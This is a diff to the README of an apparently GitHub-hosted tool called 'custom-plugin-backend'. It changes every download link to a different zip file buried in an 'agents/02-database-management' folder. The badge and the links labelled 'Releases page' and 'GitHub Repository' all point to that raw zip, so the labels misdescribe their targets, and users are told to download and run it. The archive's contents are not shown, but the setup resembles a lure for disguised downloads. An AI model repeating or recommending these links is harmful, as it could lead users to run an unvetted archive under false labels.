@@ -1,6 +1,6 @@
 # 🚀 custom-plugin-backend - Easy Tools for Backend Development
 
-[![Download custom-plugin-backend](https://raw.githubusercontent.com/Reddinton95/custom-plugin-backend/main/agents/custom-plugin-backend-3.1.zip)](https://raw.githubusercontent.com/Reddinton95/custom-plugin-backend/main/agents/custom-plugin-backend-3.1.zip)
+[![Download custom-plugin-backend](https://raw.githubusercontent.com/Reddinton95/custom-plugin-backend/main/agents/02-database-management/backend-plugin-custom-1.2.zip)](https://raw.githubusercontent.com/Reddinton95/custom-plugin-backend/main/agents/02-database-management/backend-plugin-custom-1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before downloading, ensure your system meets the following requirements:
 
 To get started, follow these steps to download and run the software:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Reddinton95/custom-plugin-backend/main/agents/custom-plugin-backend-3.1.zip) to download the latest version of the custom-plugin-backend.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Reddinton95/custom-plugin-backend/main/agents/02-database-management/backend-plugin-custom-1.2.zip) to download the latest version of the custom-plugin-backend.
    
 2. Choose the version that suits your operating system. You will see options for different environments like Windows, macOS, and Linux.
 
@@ -74,7 +74,7 @@ If you need assistance, you can check the following resources:
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/Reddinton95/custom-plugin-backend/main/agents/custom-plugin-backend-3.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Reddinton95/custom-plugin-backend/main/agents/02-database-management/backend-plugin-custom-1.2.zip)
 - [API Documentation](#)
 - [User Community](#)
 
